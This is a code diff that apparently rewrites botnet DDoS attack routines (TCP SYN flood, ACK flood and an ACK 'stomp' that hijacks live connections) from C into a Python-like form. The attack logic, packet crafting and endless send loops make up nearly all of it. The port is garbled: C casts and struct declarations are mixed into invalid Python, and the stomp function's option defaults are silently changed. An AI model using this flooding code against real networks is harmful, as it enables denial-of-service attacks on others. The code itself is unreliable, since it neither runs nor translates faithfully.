@@ -185,8 +185,10 @@ def attack_tcp_syn(targs_len, struct attack_target *targs, opts_len, struct atta
     while True:
         for i in range(targs_len):
             pkt = pkts[i]
-            struct iphdr *iph = (struct iphdr *)pkt
-            struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
+            # struct iphdr *iph = (struct iphdr *)pkt
+            # struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
+            iphdr(iph) = iphdr(pkt)
+            tcphdr(tcph) = tcphdr(iph+1)
 
             # For prefix attacks
             if targs[i].netmask < 32:
@@ -208,20 +210,21 @@ def attack_tcp_syn(targs_len, struct attack_target *targs, opts_len, struct atta
                 tcph.urg_ptr = rand_next() & 0xffff
 
             iph.check = 0
-            iph.check = checksum_generic(()iph, sizeof (struct iphdr))
+            iph.check = checksum_generic(()iph, sys.getsizeof (iphdr))
 
             tcph.check = 0
-            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20)
+            tcph.check = checksum_tcpudp(iph, tcph, htons(sys.getsizeof (tcphdr) + 20), sys.getsizeof (tcphdr) + 20)
 
             targs[i].sock_addr.sin_port = tcph.dest
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
+            sendto(fd, pkt, sys.getsizeof (iphdr) + sys.getsizeof (tcphdr) + 20, MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sys.getsizeof (sockaddr_in))
 #ifdef DEBUG
             break
             if errno != 0:
                 printf("errno = %d\n" % (errno))
 #endif
 
-def attack_tcp_ack(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+# def attack_tcp_ack(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+def attack_tcp_ack(targs_len,attack_target(targs,opts_len),attack_option(opts)):
     pkts = calloc(targs_len; sizeof ())
     ip_tos = attack_get_opt_int(opts_len; 0)
     ip_ident = attack_get_opt_int(opts_len; 0xffff)
@@ -255,18 +258,23 @@ def attack_tcp_ack(targs_len, struct attack_target *targs, opts_len, struct atta
         return
 
     for i in range(targs_len):
-        struct iphdr *iph
-        struct tcphdr *tcph
+        # struct iphdr *iph
+        # struct tcphdr *tcph
+        iphdr(iph)
+        tcphdr(tcph)
 
         pkts[i] = calloc(1510, sizeof (char))
-        iph = (struct iphdr *)pkts[i]
-        tcph = (struct tcphdr *)(iph + 1)
+        # iph = (struct iphdr *)pkts[i]
+        # tcph = (struct tcphdr *)(iph + 1)
         payload = ()(tcph + 1)
+        iph = iphdr(pkts[i])
+        tcph = tcphdr(iph+1)
+
 
         iph.version = 4
         iph.ihl = 5
         iph.tos = ip_tos
-        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len)
+        iph.tot_len = htons(sizeof (iphdr) + sizeof (tcphdr) + data_len)
         iph.id = htons(ip_ident)
         iph.ttl = ip_ttl
         if dont_frag:
@@ -300,8 +308,10 @@ def attack_tcp_ack(targs_len, struct attack_target *targs, opts_len, struct atta
     while True:
         for i in range(targs_len):
             pkt = pkts[i]
-            struct iphdr *iph = (struct iphdr *)pkt
-            struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
+            # struct iphdr *iph = (struct iphdr *)pkt
+            # struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
+            iphdr(iph) = iphdr(pkt)
+            tcphdr(tcph) = tcphdr(iph+1)
             data = ()(tcph + 1)
 
             # For prefix attacks
@@ -326,36 +336,63 @@ def attack_tcp_ack(targs_len, struct attack_target *targs, opts_len, struct atta
                 rand_str(data, data_len)
 
             iph.check = 0
-            iph.check = checksum_generic(()iph, sizeof (struct iphdr))
+            iph.check = checksum_generic(()iph, sizeof (iphdr))
 
             tcph.check = 0
-            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len)
+            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (tcphdr) + data_len), sizeof (tcphdr) + data_len)
 
             targs[i].sock_addr.sin_port = tcph.dest
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
+            sendto(fd, pkt, sizeof (iphdr) + sizeof (tcphdr) + data_len, MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sizeof (sockaddr_in))
 #ifdef DEBUG
             break
             if errno != 0:
                 printf("errno = %d\n" % (errno))
 #endif
 
-def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
-    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data))
+# def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+def attack_tcp_stomp(targs_len, attack_target(targs,opts_len), attack_option(opts)):
+    # struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data))
+    def dont_frag():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
+    	return True
+    def urg_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
+    	return False
+    def ack_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, False)
+    	return False
+    def psh_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
+    	return False
+    def rst_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
+    	return False
+    def syn_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, True)
+    	return True
+    def fin_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
+    	return False
+    def data_rand():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
+        return True
+    attack_stomp_data(stomp_data) = calloc(targs_len, sys.getsizeof(attack_stomp_data))
     pkts = calloc(targs_len; sizeof ())
     ip_tos = attack_get_opt_int(opts_len; 0)
     ip_ident = attack_get_opt_int(opts_len; 0xffff)
     ip_ttl = attack_get_opt_int(opts_len; 64)
-    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
+    # BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
+    dont_frag()
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
-    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
-    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, True)
-    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, True)
-    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
-    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, False)
-    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
-    data_len = attack_get_opt_int(opts_len; 768)
-    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
 
+    urg_fl()
+    ack_fl()
+    psh_fl()
+    rst_fl()
+    syn_fl()
+    fin_fl()
+    data_len = attack_get_opt_int(opts_len; 768)
+    data_rand()
     # Set up receive socket
     if (rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
 #ifdef DEBUG
@@ -372,8 +409,10 @@ def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct at
 
     # Retrieve all ACK/SEQ numbers
     for i in range(targs_len):
-        struct sockaddr_in addr, recv_addr
-        socklen_t recv_addr_len
+        # struct sockaddr_in addr, recv_addr
+        sockaddr_in(addr, recv_addr)
+        socklen_t(recv_addr_len)
+        # socklen_t recv_addr_len
 
         stomp_setup_nums:
 
@@ -398,26 +437,42 @@ def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct at
             addr.sin_port = htons(dport)
 
         # Actually connect, nonblocking
-        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in))
+        # connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in))
+        connect(
+            fd,
+            sockaddr(addr),
+            sys.getsizeof(sockaddr_in)
+        )
         start_recv = time.time()
 
         # Get info
         while True:
 
-            recv_addr_len = sizeof (struct sockaddr_in)
-            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len)
+            # recv_addr_len = sizeof (struct sockaddr_in)
+            recv_addr_len = sys.getsizeof(sockaddr_in)
+            # ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len)
+            ret = recvfrom(
+                rfd,
+                pktbuf,
+                sys.getsizeof(pktbuf),
+                MSG_NOSIGNAL,
+                sockaddr(recv_addr, recv_addr_len)
+            )
             if ret == -1:
 #ifdef DEBUG
                 printf("Could not listen on raw socket!\n")
 #endif
                 return
-            if recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr and ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)):
-                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr))
+            if recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr and ret > (sizeof (iphdr) + sizeof (tcphdr)):
+                # struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr))
+                tcphdr(tcph) = tcphdr(pktbuf + sys.getsizeof(iphdr))
 
                 if tcph.source == addr.sin_port:
                     if tcph.syn and tcph.ack:
-                        struct iphdr *iph
-                        struct tcphdr *tcph
+                        # struct iphdr *iph
+                        # struct tcphdr *tcph
+                        iphdr(iph)
+                        tcphdr(tcph)
 
                         stomp_data[i].addr = addr.sin_addr.s_addr
                         stomp_data[i].seq = ntohl(tcph.seq)
@@ -428,15 +483,17 @@ def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct at
                         printf("ACK Stomp got SYN+ACK!\n")
 #endif
                         # Set up the packet
-                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len)
-                        iph = (struct iphdr *)pkts[i]
-                        tcph = (struct tcphdr *)(iph + 1)
+                        pkts[i] = malloc(sizeof (iphdr) + sizeof (tcphdr) + data_len)
+                        # iph = (struct iphdr *)pkts[i]
+                        # tcph = (struct tcphdr *)(iph + 1)
+                        iph = iphdr(pkts[i])
+                        tcph = tcphdr(iph+1)
                         payload = ()(tcph + 1)
 
                         iph.version = 4
                         iph.ihl = 5
                         iph.tos = ip_tos
-                        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len)
+                        iph.tot_len = htons(sizeof (iphdr) + sizeof (tcphdr) + data_len)
                         iph.id = htons(ip_ident)
                         iph.ttl = ip_ttl
                         if dont_frag:
@@ -477,8 +534,10 @@ def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct at
     while True:
         for i in range(targs_len):
             pkt = pkts[i]
-            struct iphdr *iph = (struct iphdr *)pkt
-            struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
+            # struct iphdr *iph = (struct iphdr *)pkt
+            # struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
+            iphdr(iph) = iphdr(pkt)
+            tcphdr(tcph) = tcphdr(iph+1)
             data = ()(tcph + 1)
 
             if ip_ident == 0xffff:
@@ -488,15 +547,15 @@ def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct at
                 rand_str(data, data_len)
 
             iph.check = 0
-            iph.check = checksum_generic(()iph, sizeof (struct iphdr))
+            iph.check = checksum_generic(()iph, sizeof (iphdr))
 
             tcph.seq = htons(stomp_data[i].seq++)
             tcph.ack_seq = htons(stomp_data[i].ack_seq)
             tcph.check = 0
-            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len)
+            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (tcphdr) + data_len), sizeof (tcphdr) + data_len)
 
             targs[i].sock_addr.sin_port = tcph.dest
-            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
+            sendto(rfd, pkt, sizeof (iphdr) + sizeof (tcphdr) + data_len, MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sizeof (sockaddr_in))
 #ifdef DEBUG
             break
             if errno != 0:
